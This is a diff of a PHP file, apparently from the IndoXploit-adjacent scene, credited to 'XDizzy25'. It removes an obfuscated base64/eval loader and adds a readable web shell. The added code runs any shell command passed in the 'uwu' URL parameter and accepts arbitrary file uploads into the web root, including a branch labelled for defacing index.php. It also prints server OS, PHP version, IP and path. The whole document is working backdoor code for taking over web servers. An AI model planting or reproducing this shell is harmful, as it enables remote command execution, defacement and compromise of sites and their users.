@@ -1,4 +1,44 @@
 <?php
-// XDizzy25
-// Special thanks to CodePolitan - PetaniKode - Malasngoding - IndoXploit 
- $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=a411c9e6e09fe4f45c15c7ac6dcf306d447b1c12nZNvb9MwEMZfr1K/wymLlBRYBqsQUqe9QLSjFSCipkyTsirykmvrNbGj2OnoEN8dO3/IBm1WyLs7P7/zc+fLMQxxM4DrIX142J697XaOwc34MiNJghms+RqmGPIIYTDUZ16KgpIY5IqwtQDJYcIifp3GnEo4gQ9K6fKYSsJU9IXERLAljyhbqtBFlaaflKTboQubCoHSNoOPo5lv5aoCiax5r/ej2zEZSciCxggXYAaXk88jz7cIuyNba+5b6hCt+XkpQ4HJTpVM0qBRxqqPCzCcU0NH5WUqkfANBmWEUaBvtOuir0BDzm8rPQViuOJg3Lzu9/035/2zxH8xr4N3CXiSyFzAAL5VBeGGGbuol4+pS90mKMpo7nKMkvy5Y073eTWkIzPGuGi9OVDMUXmd4YitkJjYWtVrKRjRrC74B2moI6MNjcU+MhZwEpNW+C5P0tt9fBiB47TigkqsaDU9OHBjaulhW1Oon2xOkfnf7dHwMxuUhyEKUe3N33olUd8QFyREKLqlLMLvTrpKYe+kKFtw8XhUSJR3hWwwE5Qzu/ZmVvkg103YLZahMeQVL6Z15QqT+s2eR92xC1elhwLFJ6ypn3KJMryPGodIquyKC3m7LXyagTeaXo2mvjWezdxg/NWbqW4PcjBx4X0UZXrklQP8B/tErgCazpu/9hc=
+# Dev: XDizzy25
+# Programmer kok Recode :D
+# Spesial thanks to IndoXploit - CodePolitan - Malasngoding - PetaniKode
+if(isset($_GET['upload'])){
+$namafile = $_FILES['anjay']['name'];
+$namesem = $_FILES['anjay']['tmp_name'];
+$lok = "./";
+$upload = move_uploaded_file($namesem, $lok.$namafile);
+echo "\033[1;32m[*]\033[1;37m Status : Uploaded \n";
+echo "\033[1;32m[+]\033[1;37m File   : ".$namafile."\n";
+}
+if(isset($_GET['uwu'])){
+	$lel = $_GET['uwu'];
+	echo "".system($lel)."\n";
+}
+if(isset($_GET['dir'])){
+	echo "".system("dir")."\n";
+}
+if(isset($_GET['ls'])){
+	echo "".system("ls -la")."\n";
+}
+if(isset($_GET['jumpb'])){
+	echo "".system("cd ..")."\n";
+}
+if(isset($_GET['site'])){
+    $namafile = $_FILES['anjay']['name'];
+    $namesem = $_FILES['anjay']['tmp_name'];
+    $lok = "./";
+    $upload = move_uploaded_file($namesem, $lok.$namafile);
+    echo "\033[1;32m[*]\033[1;37m Success \n";
+    echo "\033[1;37m    Deface file index.php \n";
+}
+if(isset($_GET['infos'])){
+    $ea = phpversion();
+    $a = php_uname();
+    echo "\033[1;32m[*] \033[1;37mSystem     : ".$a."\n";
+    echo "\033[1;32m[*] \033[1;37mPHP Version: ".$ea."\n";
+    $e = getcwd();
+    $eae = gethostbyname($_SERVER['HTTP_HOST']);
+    echo "\033[1;32m[*] \033[1;37mIP Address : ".$eae."\n";
+    echo "\033[1;32m[*] \033[1;37mPath       : ".$e."\n";
+}
+?>
